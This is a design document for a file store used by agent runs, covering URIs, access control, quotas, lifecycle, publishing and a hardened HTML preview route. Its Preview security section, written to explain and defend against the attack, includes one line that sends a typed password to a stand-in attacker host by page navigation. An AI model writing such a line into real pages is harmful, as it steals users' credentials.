# Files Platform

The durable, first-class file store: user uploads that runs consume and deliverables that agents publish, addressed by a stable opaque `appfile://` URI, with access inherited from the container (run or chat session). Bidirectional — bytes flow **into** runs (user attachments) and **out of** runs (agent outputs) — and chainable: an `appfile://` produced by run A can be fed into run B.

> **Naming (issue #1177).** This platform was called _Documents_ until the rename. `document` was a false friend — the entity is ANY file an agent produced (Markdown, HTML, source code, a PDF, an image), while the word promises a Word or PDF to every reader, the model included. What did NOT move with the rename, and why: the row id prefix `doc_` (already in every row), the `documents` storage bucket and the `documents/` storage-key prefix (live objects — renaming them orphans every stored file), and the `document_deleted` deletion reason (a persisted free-text label on live rows), and the `DOCUMENT_*` / `RUN_MAX_DOCUMENTS` / `WORKSPACE_MAX_DOCS_BYTES` environment variables (renaming an env var is an ops migration on every deployment for no user-visible gain). Read compatibility for the old wire spellings is documented per-surface below and summarised in "Compatibility surface".
>
> The same issue also removed `presentation: "primary"` outright. Which file a run features is now derived from what the run produced — see "Outbound flow" and "Run page panes".

Core code: `apps/api/src/services/files.ts` (service), `apps/api/src/routes/files.ts` (routes + preview), `apps/api/src/services/file-preview.ts` (preview tokens + CSP), `packages/db/src/schema/files.ts` (schema).

## Model

One unified table (`files`) holds both origins, discriminated by `purpose`:

| `purpose`      | Origin                                                                     | Container                     | Downloadable by                   |
| -------------- | -------------------------------------------------------------------------- | ----------------------------- | --------------------------------- |
| `user_upload`  | A staged upload materialized on first consumption by a run or chat session | `run_id` or `chat_session_id` | its creator only                  |
| `agent_output` | A deliverable an agent published from a run                                | `run_id`                      | anyone who can read the container |

Key facts:

- **`downloadable` is derived, never stored** (`deriveDownloadable`): an `agent_output` is downloadable by anyone who can read the container; a `user_upload` only by its own creator — so an upload is never re-served to other actors via the API (kills the CDN-abuse vector). The `/content` route enforces it; `toFileDto` surfaces it.
- **`sha256`** is computed streaming at write (`createHashingCounter`, optionally with mid-stream byte caps, `Bun.CryptoHasher`) for integrity + agent-output dedup.
- **Attribution** (`user_id` / `end_user_id`, `package_id`) is copied from the container at creation.
- **Casing**: SQL snake_case, Drizzle TS camelCase, wire snake_case **except** the universal DB-convention carve-outs (CASING_CONVENTIONS.md 4b), which stay camelCase on the wire: `id`, `applicationId`, `packageId`, `createdAt`, `expiresAt`. `run_id` and `chat_session_id` are **not** on that list — they stay snake_case domain fields (matching the `notification` DTO's `run_id`). See `docs/CASING_CONVENTIONS.md`.

## URI scheme

`appfile://doc_<nanoid>` — opaque, **stable for the file's lifetime, never re-minted** (D6). This is the claim-check the whole platform passes around: the input-parser resolves it, chat messages store only it (never the ephemeral `upload://`), and MCP exposes it as a `resource_link`. `parseFileUri` validates the `doc_` + ≥8-char id shape before any DB hit.

**Why `appfile://` and not `file://`.** `file://` is already taken: it means the local filesystem, and MCP uses it for local resources. An opaque platform id under that scheme is ambiguous to the model and to every MCP client — one handed `file://doc_x` has every reason to try opening it on disk. The platform claims its own scheme instead.

**`document://` is read forever, never written.** The scheme was `document://` until #1177, and historical `runs.input` rows, persisted chat attachments and model-authored prompts are full of it — those runs must stay re-runnable. `packages/core/src/file-uri.ts` holds the accepted list (`ACCEPTED_FILE_URI_PREFIXES`, canonical first); every parser and extractor iterates it, and only `fileUri()` decides what gets WRITTEN, which is always the canonical form. Adding a spelling to that one list is the whole edit needed to make it parse everywhere.

The row id keeps its `doc_` prefix. It is already in every stored row and in every storage key, and it carries no vocabulary weight — re-minting it would be a data migration for zero gain.

Contrast with the ephemeral `upload://upl_x` staging handle: uploads have a short TTL (`UPLOAD_RETENTION_HOURS`) and exist only for the PUT-then-consume window; once consumed, the durable `appfile://` takes over (so `rerun_from` re-resolves `appfile://`, no longer bound to the upload retention window).

## Storage layout

A row's `storage_key` is `<bucket>/<path>`, and `parseStorageKey` (`services/files.ts`) splits it back at read time — one parser for every consumer (download, delete, orphan sweep). Two buckets:

| Bucket      | Holds                                                            | Lifetime                                         |
| ----------- | ---------------------------------------------------------------- | ------------------------------------------------ |
| `documents` | every durable file's bytes (`FILES_BUCKET`, `services/files.ts`) | until the row is deleted and its purge job runs  |
| `uploads`   | staged, not-yet-consumed upload bytes (`UPLOAD_BUCKET`)          | `UPLOAD_RETENTION_HOURS`, then the staging sweep |

**The durable bucket is still literally named `documents`, and must stay that way.** #1177 renamed the CONSTANT (`DOCUMENTS_BUCKET` → `FILES_BUCKET`) and deliberately left its VALUE alone, because the value is data, not vocabulary: every `files.storage_key` already written, in every deployment, begins with the literal `documents/`. Changing it would point every download, deletion and orphan sweep at a bucket that holds nothing — with no error until a download 404s on a file that is physically still there. There is no `files` bucket and there is not meant to be one; `orphanScanBuckets()` (`services/storage-orphans.ts`) reconciles objects under `documents` against `files.storage_key` values that all begin with `documents/`, and says so in place.

The same reasoning keeps `document_deleted` as the `storage_deletion_jobs.reason` value: a persisted free-text label on live rows, which buys nothing by being rewritten.

Run workspaces live outside both buckets, under `run-workspace/<run>/documents/*` plus a manifest the teardown worker expands (see "No silent storage orphans"). That `documents/` segment is **storage layout, not vocabulary**, for the same reason the bucket name is: `runWorkspaceFileKey` (`services/run-workspace-manifest.ts`) is the single builder for it and the deletion index resolves teardown keys through that same builder, so #1177 renamed the identifier and never the literal — do not "fix" this prefix to `files/` or every in-flight run's objects are stranded with no error until a fetch 404s mid-provisioning.

## ACL — inherited from the container (D2, D7)

No per-file grants. `getFileForActor` derives access at check time:

- **`run_id` container** → the run's read semantics: org+app scope match, plus the end-user guard (`row.endUserId !== actor.id → notFound` for an end-user actor), mirroring `routes/runs.ts`.
- **`chat_session_id` container** → chat sessions are per dashboard user; only the owner reads.
- A cross-org, cross-app, or cross-actor id is **indistinguishable from a missing one** (returns null → 404).

**Cross-actor references honour `deriveDownloadable` (a `user_upload` is creator-only content).** Because a run is org-wide-visible to members, container resolution alone would let member B reference member A's private upload. So both surfaces that hand a file to a _different_ actor's context gate on `downloadable`, not just container ACL:

- **`appfile://` run input** (`input-parser`): after `getFileForActor`, a `user_upload` whose creator is not the resolving run actor is **rejected as not-found** (404) — a member cannot deliver another member's upload into their own run. An `agent_output` stays freely referenceable by anyone who can read the run (the intended chaining case, D6). A chat-contained upload passes trivially: its creator is the chat user, who is the run actor.
- **`preview_url` / `previewable` / `preview_kind`** (`toFileDto`): a `previewable` boolean and a `preview_kind` (`html` | `image` | `pdf` | `text`, or null) ride every row (true / non-null for a readable file of a previewable kind — see "Preview kinds" below), but the signed `preview_url` is minted **only** on the single-file `GET /api/files/{id}` — list rows carry `previewable` + `preview_kind` and no token (a gallery page must not sign a short-lived token per row; the preview modal refetches the single GET for a fresh token on open). Both flags and the URL are gated on `downloadable`, so a member never receives a working preview link (nor a non-null `preview_kind`) for another member's `user_upload`. The preview token additionally binds the minting actor, and the preview route re-checks it against a `user_upload`'s creator — a hand-crafted token that verifies is still refused (401).

`listFilesForActor` (the gallery) applies the same visibility: a member sees every run-contained file in the app (mirroring the org-wide runs list) plus chat-contained files only from their own sessions; an end-user sees only their own rows (`actorScopeFilter`). Keyset pagination on `(createdAt, id)` DESC.

The cookie-less preview route uses `loadFileForPreview` (org-scoped only) — its signed token IS the authorization; for a `user_upload` the token's bound creator must match the file's, so no container re-check is needed while private uploads stay creator-only.

## Quotas, retention, GC (D3, D4)

All quotas are **synchronous at the write** (async quotas are a documented footgun):

- **`DOCUMENT_MAX_FILE_BYTES`** (default 100 MiB) — per-file cap → 413.
- **`ORG_STORAGE_QUOTA_BYTES`** (default unlimited) — per-org byte quota tracked transactionally on `organizations.files_bytes_used`, re-checked under `FOR UPDATE` inside the commit → 403 `storage_limit_exceeded`. The effective limit is `organizations.files_bytes_limit ?? ORG_STORAGE_QUOTA_BYTES ?? unlimited` (`effectiveOrgStorageLimit`). A metering module (e.g. Cloud) is the logical owner of the per-org override: it maps its own plan to a byte value and writes it through the `PlatformServices.setFileStorageLimit` capability (enforcement 100% core, pricing 100% cloud — zero-billing-vocab constraint). The env var stays the OSS fallback when no override is set.
- **`RUN_MAX_OUTPUT_BYTES`** (default 256 MiB) — ceiling on total bytes a single run may publish, enforced mid-stream on the ingestion path.

The S3 write completes **before** the DB commit, so any DB failure deletes the just-written object (`commitFileRow`) — bytes are never stranded uncounted.

**Counter drift & reconciliation.** The `files_bytes_used` counter is maintained transactionally on every `createFileFromUpload` / `createFileFromStream` / `deleteFile`, on detach-or-delete, and before the application/end-user cascades remove their file rows. Each of those paths locks the organization first, matching the write lock order, so a concurrent write cannot be omitted or double-counted. `reconcileOrgFileBytes()` (files.ts) still locks each organization row and recomputes from `SUM(files.size)` once per day as defense in depth for legacy data, manual SQL, or an unmediated FK cascade. Transactional maintenance is the correctness path; reconciliation is not required for normal quota accuracy.

**No silent storage orphans.** Every service-mediated row deletion records its storage key in `storage_deletion_jobs` in the same transaction. Organization/application teardown also records each run bundle and manifest; the worker reads the manifest, deletes every `run-workspace/<run>/documents/*` object, and deletes the manifest last so a partial failure remains retryable. End-user deletion does **not** enqueue run-workspace jobs because runs survive with `end_user_id = NULL`. `scripts/storage-orphans.ts` uses the storage list capability as an operator backstop for legacy/unmediated file objects, not as the primary deletion mechanism.

**Retention**: default permanent (`expires_at` null). `DOCUMENT_RETENTION_DAYS` (default unset) stamps a default `expires_at` at creation (operator-set instance policy, GitLab pattern). `cleanupExpiredFiles` sweeps the partial index (`WHERE expires_at IS NOT NULL`) every 15 min (`startFileGc`, wired in `boot.ts`), batch-deleting rows, decrementing each org counter, and atomically enqueuing the corresponding object purges.

## Lifecycle & chaining (D8)

An `appfile://` is **durable and chainable**: an `agent_output` from run A can be fed into run B as input, and must outlive A's deletion. Two pieces of machinery deliver that promise — a consumption ledger and a detach-or-delete teardown — so the two user-driven container deletions leave **no orphan storage objects and no counter drift**.

**Consumption ledger (`file_links`).** Every `appfile://` resolved as a run input writes a `(file_id, consumer_run_id)` link — the record of "which _other_ runs still need this file". Run creation locks and revalidates every referenced file in the org+application scope, then inserts the run and its links in **one transaction**. Either all inputs are protected or no run is created (`409 file_unavailable`); there is no resolve/create deletion window. Duplicate ids are deduplicated and link inserts remain idempotent (`onConflictDoNothing`). A run never links to its own outputs (the consumer run is brand-new, so it is never an input file's own container).

**Detach-or-delete teardown.** The two user-driven container deletions — `DELETE /agents/:pkg/runs` (`deletePackageRuns`) and `DELETE /api/chat/sessions/:id` (the `cleanupSessionFiles` seam) — no longer let the FK cascade blindly drop contained files. `detachOrDeleteContainedFiles` runs **before** the container delete and decides per contained file:

- **Protected → detach.** A file a live consumer outside the deleted set still needs (run variant: a `file_links` row whose `consumer_run_id` is not in the deleted run set; chat variant: _any_ link at all — a chat session is never itself a consumer) is **detached**: its container is NULLed, but id, bytes, counter, and storage object are untouched. A rerun of the surviving consumer still resolves the same `appfile://` URI.
- **Unprotected → delete.** Nothing else references it: the row is deleted, the org byte counter decremented, and a durable storage-deletion job enqueued in one transaction.

Explicit `DELETE /api/files/:id` uses the same row lock and refuses a linked file with `409 file_in_use`. Retention GC likewise skips linked expired files; once their consumer links disappear, a later sweep can reclaim them.

Because the delete branch decrements the counter and durably queues the object purge, these two paths produce **no orphan objects and no counter drift**. The teardown runs in its own transaction, separate from the container delete: a crash between the two is idempotent (a re-attempt finds the files already handled and finishes the runs/session delete).

**Detached ACL.** A detached file (both containers NULL — the legal state under `chk_files_single_container`) has no container to inherit an ACL from, so `getFileForActor` falls back to org+app scope plus the end-user guard (an end-user reads only its own rows). On top of that:

- a detached **`user_upload` is creator-only in full** — metadata included: a non-creator is refused at `getFileForActor` (resolves to null → 404) and the row is excluded from other members' lists. Deletion never widens a private upload.
- a detached **`agent_output` stays org+app-readable** — exactly the chaining case: run B (any org member who could read run A) can still read and re-consume run A's now-detached output.

**Scope boundary.** Only **run-input consumption** is protected — that is the sole relationship the ledger tracks. A chat message that merely _references_ a deleted run's file is not a consumer; once that run (and its file) is gone the reference degrades to a clean **404**, the same as a link to a deleted run. Tenant teardown (org / application / end-user delete) deliberately does not detach linked files: its finality wins over chaining. It still locks the parent before enumeration, accounts bytes synchronously, and enqueues every owned object before the FK cascade. End-user teardown is the exception for runs themselves: runs survive via `ON DELETE SET NULL`, so their workspaces are preserved.

## Native primitive vs import/export integrations (D9)

**Decision.** `appfile://` is a **native platform primitive** — the canonical store lives in the `files` table, addressed by the platform's own opaque URI. External repositories (Google Drive, S3, Dropbox, …) are **import/export integrations**, never the canonical store.

**Why the canonical store cannot be an external repository.** The three guarantees the rest of this document relies on are all things only a first-party store can provide:

1. **Container-inherited ACL evaluated at platform check time** (D2/D7). Access is derived from the run/chat container at read time, in the platform's own authorization context. A foreign repository has its own ACL model the platform neither owns nor can evaluate per request against the run/chat container.
2. **Synchronous quota enforcement at the write** (D3). `ORG_STORAGE_QUOTA_BYTES` is re-checked under `FOR UPDATE` inside the write transaction (403 before the bytes land). An external repository enforces its own limits asynchronously, if at all — the platform cannot make a byte-exact admission decision at write time against a store it does not transact with.
3. **Lifelong opaque URI stability + the lifecycle guarantees above** (D6/D8). The `appfile://` id is stable for life and never re-minted; detach-or-delete keeps a chained file resolvable across its producer's deletion. External links are mutable, can expire, and can be re-minted or revoked out from under the platform.

An external repository can guarantee none of the three. Integrations therefore stay the right home for the two directions that _do_ cross the boundary: **import** (pull external bytes in → materialize them as an `appfile://`) and **export** (push a published file out to a repository). The canonical copy — its ACL, its quota, its lifecycle — stays on the platform.

## Inbound flow — upload → file

1. `POST /api/uploads` stages an upload; `PUT` streams the bytes into the ephemeral `uploads` bucket.
2. On consumption (`upload://` in a run input, or a chat attachment), `createFileFromUpload` streams the `uploads` bucket → the durable file bucket (still named `documents` on the wire — #1177 renamed the table, not the storage keys) (hashing on the fly, reusing `consumeUploadStream` for size + magic-byte MIME validation), inserts the row, and increments the quota — transactionally.
3. The persisted run input is rewritten `upload://upl_x` → `appfile://doc_y` (durable source of truth). `materializeRunUploads` runs after the run row exists; a failure rolls back the batch and fails the run loudly.

## Outbound flow — agent → file

- **`POST /api/runs/:runId/files`** (`routes/runs-events.ts`) — guarded by `verifyRunUploadSignature` (sink HMAC over an empty body, agent-side), streaming raw bytes with metadata via headers. `createFileFromStream` enforces the per-file + per-run caps mid-stream (`createHashingCounter` with caps), the org quota transactionally, and dedups by `(run, sha256, name)` for at-least-once retries. Dedup is enforced in two layers: a fast-path pre-commit SELECT, and — for the concurrent-publish race where both callers pass that SELECT — a partial **unique index** `(run_id, sha256, name) WHERE purpose = 'agent_output'`, whose violation the commit path catches and resolves to the same existing row (dedup 200). The retired `X-Document-Presentation` header (there was never an `X-File-` spelling — it was dropped before the `document` → `file` rename) is read by nobody and is ignored rather than rejected, so an older runtime-pi image publishing with it still gets a 201. A genuinely new publish (201) also emits a **`file.published`** audit event attributed to the run's actor.
- **`publish_file` runtime tool** (opt-in via `manifest.runtime_tools`) — reads a workspace file, POSTs it to that route (signed), and emits the canonical **`file.published`** event via `_meta["dev.appstrate/events"]`. It takes no presentation argument: the `presentation: "primary"` option was removed in #1177 (a retired `presentation` argument on a pre-rename manifest is ignored, never rejected) — which file a run features is derived from what it produced, not declared by the model. Unlike the pure event-emitter runtime tools it has an injected HTTP uploader (built in the entrypoint, not `buildRuntimeToolDefs`).
- **`workspace/outputs/` sweep** — at finalize the entrypoint uploads any not-yet-published file in `outputs/`, emitting the events before `events/finalize` (OpenAI annotation-loss lesson). The runtime tracks both the server identity `(sha256, name)` and the canonical source file's last published SHA-256: an unchanged file explicitly published under a custom display name is not republished under its basename, while distinct files with identical bytes remain distinct. Uploads are bounded-concurrent (3 at a time) and each POST retries (3 attempts) on transient failures (network error, timeout, 5xx, 429 — honouring `Retry-After`); a file abandoned after retries is logged as a dropped deliverable and never blocks finalize.
  - **Hidden files are excluded by default.** The sweep skips any entry whose relative path has a segment starting with `.` — dotfiles like `.env`/`.netrc` and everything under a hidden dir like `.git/`. Since it publishes to a wider, durable, org-visible surface, an agent that inadvertently writes a secret dotfile under `outputs/` must not have it exfiltrated automatically. The explicit `publish_file` tool is unaffected: a deliberate publish of a dotfile is still allowed — see "Hidden-file policy" under Hardening for why the asymmetry is deliberate.

`file.published` is ingested into a `run_log` (`type='result'`, `event='file'`) and forwarded over SSE (`run_update` / `run_log`), so run page and chat cards update live. Readers also accept `event='document'`, the pre-#1177 spelling: a persisted log line is immutable once written, and the emitter behind it — a runtime image — deploys on its own clock. The accepted set is `PUBLISHED_FILE_LOG_EVENTS` (`@appstrate/core/file-uri`), shared by the run page and the chat run card, because two copies of that list is how one of them silently stops matching and a file list never refreshes. **Which file is featured is derived client-side from the count of what the run PRODUCED** (`featuredRunFile`, shared by the run page's Outcome tab and the chat card): 0 produced files feature nothing, exactly 1 is featured and opened, several are listed under **Files** for the user to pick. Only `purpose = 'agent_output'` rows belonging to this run count — an input it merely consumed never makes a run single-file. In the chat the rule additionally waits for a SETTLED run (terminal status, live tail closed): a run publishing three files emits them one at a time, so a mid-stream count of 1 is not the final count and opening on it would auto-present the first of three (`autoPresentFile`, `packages/module-chat/src/ui/run-events.ts`). There is no server field, column or index behind any of it: the derived run-DTO field `primary_document_id`, the `documents.presentation` column, its partial unique index `uq_documents_run_primary` and the transactional primary swap were all removed in #1177 (migration `0042`, which ran before the rename — hence the old spellings). A deleted or expired file simply stops being counted, and there is no second pointer to repair.

## Run report

An agent's user-facing report is **a file**. The convention: the agent writes it under `outputs/` with a concise, task-specific name that remains understandable outside the run (for example, `outputs/analyse-concurrents-restaurants-lyon.md`) and, when `publish_file` is enabled, calls `publish_file({ path })` after the final edit — or simply leaves it under `outputs/` for the finalize sweep. Nothing about presentation is asked of the agent: `primary` conflated "how important is this file" with "does the UI open it", forcing a producing agent to arbitrate a question that was never its call. The rule is derived from the count instead (above). The shared `run_and_wait` client exposes `publish_file` to every inline run without rewriting its prompt; named draft and published agents remain opt-in through their versioned `runtime_tools` manifest. Context-free names such as `report.md`, `summary.md`, `output.md`, `result.md`, `document.md` and `file.md` are explicitly discouraged in the platform prompt. The finalize `outputs/` sweep auto-publishes every other deliverable, and it feeds the same count — a second published file is precisely what turns a featured single file into a plain list.

- **Consultation path**: when the run produced exactly one file, the run page opens it in its **Outcome** tab and still lists it under **Files** with its descriptive filename. When it produced none or several, Outcome features nothing and the complete set stays under **Files**. Markdown renders inline client-side and sanitized (see "Preview kinds", 1 MiB inline cap); the cookie-less server preview route still serves markdown as inert `text/plain` (the rich render is a viewer-side `<Markdown>` render, never the iframe).
- **Compatibility**: the `report` runtime tool was **removed**, not deprecated. The runtime no longer builds it (`buildRuntimeToolDefs`), a `report.appended` envelope posted to the ingestion route is accepted and dropped, and no write path fills `runs.result.text` any more (`runResultSchema` rejects the key). Existing manifests stay valid and runnable: the retired id is stripped on read by `dropRetiredRuntimeTools` (`@appstrate/core/validation`) rather than failing validation. What survives is history only — `run_logs` rows (`type='result'`, `event='report'`) and `runs.result.text` / `text_truncated` on runs finalized before the removal remain in the database and are served verbatim by the API, but **no product surface renders them**: the run page's Outcome pane gates its Output section on a structured `output`, and `buildLogEntries` skips the legacy report rows explicitly so they cannot surface as contextless log lines. Agents write a descriptively named file under `outputs/` (auto-published by the finalize sweep) or call `publish_file`.

## Run page panes

The run-detail page is four FIXED tabs (`apps/web/src/lib/run-detail-tabs.ts`). Every one renders for every run, so the strip has the same shape whichever run is open and no deep link can land on a pane that is not there:

| Tab             | Answers                                                                                                                        |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------ |
| `outcome`       | What the run produced — the `output` tool's value, the files it produced (featured per the derived rule), the memory it wrote. |
| `files`         | Every file attached to the run: imported AND produced.                                                                         |
| `execution`     | How it ran — logs, execution details, usage, per-turn breakdown, input payload, identifiers.                                   |
| `configuration` | How it was set up — agent, version, trigger, connections.                                                                      |

Tab keys above are the URL hashes; in the French UI the panes read « Fichiers », « Exécution » and « Configuration », and Outcome's first section is « Output ».
The previous set (result / deliverable / logs / memory / files / info) grew by accretion, mixed those questions across five panes, and made two of them appear and disappear per run. « Résultat » is now « Output »: the section is literally what the `output` tool emitted, not a verdict on the run. The top bar states whether a run is an inline run or an agent run.

A run opened with no hash lands on `outcome` when it produced anything at all (a file, an output value, a memory write) and on `execution` otherwise, where the logs say why. Every retired hash still resolves — `#deliverable`, `#result` and `#memory` → `outcome`, `#documents` → `files`, `#logs` and `#info` → `execution`. Nothing is ever dropped from that table: a hash removed from it stops resolving and silently falls back to the default pane, which is exactly the "my link stopped working" nobody reports.

The `outcome` and `files` panes read the SAME query (the run's files in one page, filtered client-side), so the two panes cost one request between them and cannot disagree about what the run produced.

## HTTP surface

| Method + path                        | Guard                                             | Purpose                                                 |
| ------------------------------------ | ------------------------------------------------- | ------------------------------------------------------- |
| `GET /api/files`                     | `files:read` + actor filter                       | Gallery listing, keyset-paginated                       |
| `GET /api/files/{id}`                | `files:read` + container ACL                      | Metadata DTO; the only surface that mints `preview_url` |
| `GET /api/files/{id}/content`        | `files:read` + `download` capability              | 307 → presigned GET, or proxy-stream                    |
| `DELETE /api/files/{id}`             | `capabilities.delete` (creator OR `files:delete`) | Delete; 409 `file_in_use` on a linked file              |
| `POST /api/files/{id}/keep`          | `capabilities.keep`                               | Clear `expires_at`                                      |
| `GET /preview/files/{id}?t=…`        | signed token only, no auth pipeline               | Hardened preview bytes — contract below                 |
| `GET /api/runs/{runId}/files`        | run HMAC                                          | The input manifest the runtime mounts                   |
| `POST /api/runs/{runId}/files`       | run upload HMAC                                   | Publish an `agent_output`                               |
| `GET /api/runs/{runId}/files/{name}` | run HMAC                                          | Fetch one mounted input by workspace name               |

**Every path above is ALSO registered under its pre-#1177 spelling** — `/api/documents…`, `/api/runs/{runId}/documents…`, `/preview/documents/{id}` — on the SAME handler with the same guards, and published with `deprecated: true`. The caller set is not all ours: a pinned SPA build, the CLI, MCP clients and third-party integrations hold the old URLs, and the run routes additionally answer a runtime image older than the platform.

They are duplicate literal registrations rather than a rewrite middleware, deliberately. `scripts/verify-openapi.ts` proves spec and code describe the same endpoint set in BOTH directions (§5 Code ⊆ Spec, §5b Spec ⊆ Code) by statically scanning `router.METHOD("literal", …)` calls; a middleware would make every deprecated path spec-only and force an allowlist entry — buying brevity by switching off the gate that keeps the published contract honest. The spec side derives each alias from the canonical table (`openapi/paths/files.ts`, `openapi/paths/runs.ts`) so the two cannot drift, suffixing every `operationId` with `Deprecated` because OpenAPI requires them to be unique and a generated client would otherwise collide.

`/api/documents` must also stay listed in `APP_SCOPED_PREFIXES` (`apps/api/src/index.ts`). Without the prefix match `requireAppContext()` never runs, `applicationId` is never pinned, and the shared handler's `getAppScope()` throws a bare 500 — a deprecated alias that 500s is worse than one that does not exist.

**Permission resource: `files:read` / `files:delete`.** The retired `documents:read` / `documents:delete` spellings are **not** accepted any more — `makePermissionGuard` matches the required `resource:action` string verbatim, and there is no alias table. A `resource:action` string is persisted inside every credential ever issued (`api_keys.scopes`, `oauth_clients.scopes`, `oauth_consents.scopes`, `oauth_refresh_tokens.scopes`, `oauth_access_tokens.scopes`, plus the space-delimited `cli_refresh_tokens.scope` / `device_codes.scope`), so the rename is carried entirely by data: migrations `0044` and `0045` rewrite those seven columns in place, and the rename shipped in the same release as them — no credential predates the rewrite. Third-party provider scopes (`integrations.scopes_granted`, `application_social_providers.scopes`) are deliberately out of scope for the rewrite. What this costs: a caller that still SENDS `documents:read` (a hardcoded `scope=` in a third-party OAuth client, an `OIDC_INSTANCE_CLIENTS` env entry) is refused rather than rewritten — `invalid_scope` at the Better Auth boundary, or an `InstanceClientSyncError` naming the offending scope at boot. Both failures name the string; neither is silent.

## Preview security (D5)

Previewable files are served **only** from a hardened, cookie-less route, `GET /preview/files/:id` — mounted **outside `/api`, before the auth pipeline**, so no cookie/API-key/org middleware ever touches it. Shared layers (every kind):

- **Token-only auth**: a short-lived signed token in the URL (`?t=`, `PREVIEW_TOKEN_TTL_SECONDS` = 300), minted by `GET /api/files/:id` (`mintPreviewUrl`), verified constant-time, bound to one file id. No session is read; a request without a token is 401. Never sets a cookie.
- **Hardening headers**: `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer`, `Cache-Control: private, no-store`, COOP `same-origin`, CORP tuned to same-origin vs cross-origin serving.
- **10 MiB cap** (`PREVIEW_MAX_BYTES`) and the **S1 creator gate** (a `user_upload` preview is refused unless the token's bound minting actor matches the file's creator) apply to all kinds.
- **Active HTML requires a nested frame — in every mode.** The route serves `html` as **active HTML only for a proven nested-document load** (`Sec-Fetch-Dest: iframe`, a browser-set header script cannot forge); every other context — top-level navigation, `fetch`, `object`/`embed`, and a **missing** header (non-browser client, or a browser too old to send it) — is served as inert `text/plain; charset=utf-8` source with `default-src 'none'`. Fail-closed, `Vary: Sec-Fetch-Dest`, and **no separate-origin exemption**. Why a top-level render is refused rather than hardened: the CSP blocks exfiltration (`connect-src`, `form-action`, `img-src`, `base-uri`) and its `sandbox allow-scripts` revokes the file's origin, but a sandboxed navigable may **always navigate itself** — measured in Chrome against that exact header, a top-level `location = …`, `<meta http-equiv="refresh">` and a plain `<a href>` click all succeed. The attack that survives is not "reach the app's session": the agent-authored file **is** the fake login page, rendered top-level on a hostname the user trusts, and what the victim types leaves **by navigation** (`location = "https://evil.example/?p=" + password`) — a channel no CSP directive covers. Refusing the render is the only control over it. Degrading rather than erroring keeps a shared link readable: the token holder sees the markup as source, which it could download anyway, but nothing renders. The decision lives in one function, `mayServeActiveHtml(secFetchDest)` (`services/file-preview.ts`) — its only input is the loading context.
- **Product consequence**: two degradations, and the second is easy to miss.
  - **Top-level**: a `preview_url` opened in its own tab (shared link, "open in new tab") shows the file's **source**, not the rendered page — in every mode.
  - **Inside the modal**: a UA that does not send `Sec-Fetch-Dest` at all (Safari < 16.4, named above) now falls to the same inert source **in the modal too**, and in `USERCONTENT_URL` deployments as well — where the removed separate-origin short-circuit used to render it. The modal keeps rendering for every UA that does send the header, which is what the gate is keyed on.
- **Separate origin (optional)**: `USERCONTENT_URL` points a second registrable domain (eTLD+1) at the same server → the browser gives the preview its own cookie jar, storage partition, and process (site isolation). When set, `preview_url` is minted on that origin. It does **not** unlock a top-level active render (above); its value is defence in depth for the render that does happen. Note what that value is **not**: a proxy stripping the CSP header does not put agent script on the app's host with the SPA's storage and cookies, because the only context that renders active HTML is the SPA's `<iframe sandbox="allow-scripts">` and that **attribute** survives header stripping — the document stays opaque-origin either way. The residuals a separate host is genuinely the last layer against are (a) a UA that ignores sandboxing altogether, which ignores the attribute exactly as it ignores the header; (b) a **future app-origin embedder that frames the preview without the attribute** — `frame-ancestors <appOrigin>` deliberately permits any app-origin page to frame it, so for such an embedder the response header is the only control; and (c) the ordinary partition — its own cookie jar, storage and process. Cloud always sets it. Because none of that is verifiable at runtime, the env schema refuses to boot when `USERCONTENT_URL` shares `APP_URL`'s **host** (identical value, or the same host on another port/scheme — cookies are host-scoped, not origin-scoped), and requires `https://` in production. A different registrable domain is stronger than a different host but is not machine-checked (correct eTLD+1 detection needs the Public Suffix List), so it stays the documented recommendation while a different host is the enforced floor. Setting it also changes the **SPA document's** CSP: `frame-src` names this origin instead of `'self'`, so the two move together automatically (`buildSpaCsp()`) — there is no second place to update.

### Preview kinds

A file's mime is classified by `previewKind()` (one source of truth for `preview_kind`, `previewable`, and the route's serving branch):

| `preview_kind` | Mimes                                                         | Served as                                                                                                                                                     | Frontend render                                                     |
| -------------- | ------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------- |
| `html`         | `text/html`                                                   | Buffered, `<meta>` CSP injected, strict CSP header (`script-src`/`style-src 'unsafe-inline'`, `sandbox allow-scripts`), full `Permissions-Policy`             | `sandbox="allow-scripts"` iframe                                    |
| `image`        | `image/png`, `image/jpeg`, `image/gif`, `image/webp`          | Streamed, stored mime, `inline`, `default-src 'none'` CSP                                                                                                     | `<img>`                                                             |
| `pdf`          | `application/pdf`                                             | Streamed, stored mime, `inline`, `default-src 'none'` CSP                                                                                                     | **sandboxless** `<iframe>` (native viewer)                          |
| `text`         | `text/plain`, `text/markdown`, `text/csv`, `application/json` | Streamed, **always relabelled `text/plain; charset=utf-8`**, `inline`, `default-src 'none'` CSP (client-side `fetch()` allowed by the global CORS middleware) | `fetch()` → `<pre>`; **markdown → sanitized rich render** (≤ 1 MiB) |
| (null)         | everything else                                               | 404 (indistinguishable from not-found)                                                                                                                        | download only                                                       |

- **HTML** is the only ACTIVE-content kind and keeps the full treatment: a strict `Content-Security-Policy` header **and** a parse-time `<meta http-equiv>` CSP injected as the first child of `<head>` (`injectMetaCsp`) — covers the relative-URL / `srcdoc` bypass a header alone can miss. That treatment is applied **only** to an iframe load; any other context gets the inert `text/plain` degradation described above.
- **CSP `sandbox` (header only)**: the header copy carries `sandbox allow-scripts` and no other token, putting the response in an **opaque origin**. Measured in Chrome against a server sending exactly this header: `window.origin === "null"`, `localStorage` / `sessionStorage` / `document.cookie` throw `SecurityError`, `window.open` returns null. `allow-same-origin` is rejected because it hands the origin back, `allow-popups*` because a popup would be an attacker-controlled window opened from a trusted hostname, `allow-top-navigation*` because the frame must never steer the tab around it (the "by user activation" variant is worthless — the attack _is_ a click). The injected `<meta>` copy omits `sandbox`, which a meta context ignores; `buildPreviewCsp()` therefore returns `{ header, meta }` so the two cannot be swapped. (`frame-ancestors` is ignored in a meta context too and is kept there anyway — that one is redundant-but-true, because the header copy still enforces it; `sandbox` is the directive that would be lost outright if the two strings were collapsed into one to remove the divergence.) COOP `same-origin` is **inert** on this branch — COOP is processed for top-level documents only, and the active branch is served exclusively to `Sec-Fetch-Dest: iframe`. It stays because the inert `text/plain` branch **is** reachable top-level, where it does its normal job. The header copy is not redundant with the iframe element's `sandbox` attribute (the two **intersect**, so the token sets must move together): `frame-ancestors` lets any page on the app origin frame the preview, so the header is what still applies if a future embedder forgets the attribute.
